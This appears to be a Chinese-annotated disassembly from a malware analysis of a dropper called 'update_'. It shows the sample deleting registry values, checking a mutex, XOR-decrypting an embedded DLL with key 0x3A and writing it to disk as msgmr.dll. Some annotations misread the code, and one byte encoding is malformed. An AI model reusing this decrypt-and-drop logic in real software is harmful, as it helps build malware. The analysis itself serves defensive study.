
```
004012F8  |.  68 02000080        push 80000002                                          ; |hKey = HKEY\_LOCAL\_MACHINE  

004012FD  |.  FF15 08204000      call dword ptr ds:[<&ADVAPI32.RegOpenKeyExA>]          ; \RegOpenKeyExA  

00401303  |.  85C0              test eax,eax  

00401305  |.  75 25             jnz short update\_.0040132C  

00401307  |.  56                push esi                                               ;  判定注册表项是否存在 JavaView 键值，如存在则将其删除  

00401308  |.  8B35 04204000     mov esi,dword ptr ds:[<&ADVAPI32.RegDeleteValueA>]     ;  ADVAPI32.RegDeleteValueA  

0040130E  |.  68 CC214000       push update\_.004021CC                                 ; /javaview  

00401313  |.  FF75 FC           push [local.1]                                         ; |hKey  

00401316  |.  FFD6              call esi                                               ; \RegDeleteValueA  

00401318  |.  68 C0214000       push update\_.004021C0                                 ; /desktopwin  

0040131D  |.  FF75 FC           push [local.1]                                         ; |hKey  

00401320  |.  FFD6              call esi                                               ; \RegDeleteValueA  

00401322  |.  FF75 FC           push [local.1]                                         ; /hKey  

00401325  |.  FF15 0C204000     call dword ptr ds:[<&ADVAPI32.RegCloseKey>]            ; \RegCloseKey  

0040132B  |.  5E                pop esi  

0040132C  |>  C9                leave  

0040132D  \.  C3                retn  

  }  

0040133C  |.  68 FC214000       push update\_.004021FC                                 ; /\_\_dl\_core4gaex\_mutex\_\_  

00401341  |.  6A 00             push 0                                                 ; |Inheritable = FALSE  

00401343  |.  6A 01             push 1                                                 ; |Access = 1  

00401345  |.  FF15 50204000     call dword ptr ds:[<&KERNEL32.OpenMutexA>]             ; \OpenMutexA  

0040134B  |.  85C0              test eax,eax  

0040134D  |.  0F85 97000000     jnz update\_.004013EA  

00401353  |.  56                push esi                                               ;  判定是否有此互斥，如有则跳过不释放病毒 DLL，如无则继续执行  

00401354  |.  68 04010000       push 104                                               ; /病毒调用 API 函数 GetFileAttributesA，获取目录文件列表  

00401359  |.  8D85 FCFEFFFF     lea eax,[local.65]                                      ; |  

0040135F  |.  50                push eax                                               ; |Buffer  

00401360  |.  FF15 20204000     call dword ptr ds:[<&KERNEL32.GetWindowsDirectoryA>]    ; \GetWindowsDirectoryA  

00401366  |.  8B35 24204000     mov esi,dword ptr ds:[<&KERNEL32.lstrcatA>]            ;  kernel32.lstrcatA  

0040136C  |.  68 E4214000       push update\_.004021E4                                 ; /program files\\messenger\_\_dl\_core4gaex\_mutex\_\_  

00401371  |.  8D85 FCFEFFFF     lea eax,[local.65]                                      ; |  

00401377  |.  50                push eax                                               ; |ConcatString  

00401378  |.  C685 FFFFEFFFF 00  mov byte ptr ss:[ebp-101],0                           ; |  

0040137F  |.  FFD6              call esi                                               ; \lstrcatA  

00401381  |.  8D85 FCFEFFFF     lea eax,[local.65]  

00401387  |.  50                push eax                                               ; /FileName  

00401388  |.  FF15 28204000     call dword ptr ds:[<&KERNEL32.GetFileAttributesA>]     ; \GetFileAttributesA  

0040138E  |.  83F8 10           cmp eax,10                                             ;  是否大于 10 个，如大于等于 10 个则跳过不创建 AppPatch 目录，如小于 10 则创建此目录  

00401391  |.  74 0F             je short update\_.004013A2  

00401393  |.  6A 00             push 0                                                 ; /pSecurity = NULL  

00401395  |.  8D85 FCFEFFFF     lea eax,[local.65]                                      ; |  

0040139B  |.  50                push eax                                               ; |Path  

0040139C  |.  FF15 2C204000     call dword ptr ds:[<&KERNEL32.CreateDirectoryA>]       ; \CreateDirectoryA  

004013A2  |>  68 D8214000       push update\_.004021D8                                 ;  创建文件名称：\\msgmr.dll  

004013A7  |.  8D85 FCFEFFFF     lea eax,[local.65]  

004013AD  |.  50                push eax  

004013AE  |.  FFD6              call esi  

004013B0  |.  8D85 FCFEFFFF     lea eax,[local.65]  

004013B6  |.  50                push eax  

004013B7  |.  E8 44FCFFFF       call update\_.00401000                                 ;  下载者解密（跟进！）  

  { // call 00401000  

00401000   $  6A 10              push 10                                              ;  解密解密！  

00401002   .  68 F0204000       push update\_.004020F0  

00401007   .  E8 9C050000       call update\_.004015A8  

0040100C   .  33F6              xor esi,esi  

0040100E   .  8975 FC           mov dword ptr ss:[ebp-4],esi  

00401011   .  8975 E4           mov dword ptr ss:[ebp-1C],esi  

00401014   >  817D E4 00090000  cmp dword ptr ss:[ebp-1C],900                          ;  运算次数 0x900 = 2304 次  

0040101B   .  73 17              jnb short update\_.00401034  

0040101D   .  8B45 E4           mov eax,dword ptr ss:[ebp-1C]  

00401020   .  8D80 10304000     lea eax,dword ptr ds:[eax+403010]                      ;  文件存在地址=00403010  

00401026   .  33C9              xor ecx,ecx  

00401028   .  8A08              mov cl,byte ptr ds:[eax]                               ;  取出加密数据准备开始做解密运算  

0040102A   .  83F1 3A           xor ecx,3A                                             ;  简单的异或处理 xor ecx,3A  

0040102D   .  8808              mov byte ptr ds:[eax],cl                               ;  解密后的数据存放处  

0040102F   .  FF45 E4           inc dword ptr ss:[ebp-1C]                              ;  [ebp-1C]自加 1，取下一个加密位置中的数据  

00401032   .^ EB E0             jmp short update\_.00401014  

00401034   >  56                push esi                                               ; /解密完毕准备合并后释放文件  

00401035   .  56                push esi                                               ; |Attributes  

00401036   .  6A 02              push 2                                                 ; |Mode = CREATE\_ALWAYS  

00401038   .  56                push esi                                               ; |pSecurity  

00401039   .  56                push esi                                               ; |ShareMode  

0040103A   .  68 00000040        push 40000000                                          ; |Access = GENERIC\_WRITE  

0040103F   .  FF75 08           push dword ptr ss:[ebp+8]                              ; |FileName  

00401042   .  FF15 48204000     call dword ptr ds:[<&KERNEL32.CreateFileA>]            ; \CreateFileA  

00401048   .  8BF8              mov edi,eax  

0040104A   .  897D E0           mov dword ptr ss:[ebp-20],edi  

0040104D   .  83FF FF           cmp edi,-1  

00401050   .  74 2D              je short update\_.0040107F  

00401052   .  56                push esi                                               ; /pOverlapped  

00401053   .  8D45 E4           lea eax,dword ptr ss:[ebp-1C]                          ; |  

00401056   .  50                push eax                                               ; |pBytesWritten  

00401057   .  68 003E0000        push 3E00                                             ; |释放后文件大小：0x3E00 = 15872 字节  

0040105C   .  68 10304000        push update\_.00403010                                 ; |找到内存中要释放文件的偏移地址  

00401061   .  57                push edi                                               ; |hFile  

00401062   .  FF15 4C204000     call dword ptr ds:[<&KERNEL32.WriteFile>]              ; \WriteFile  
```
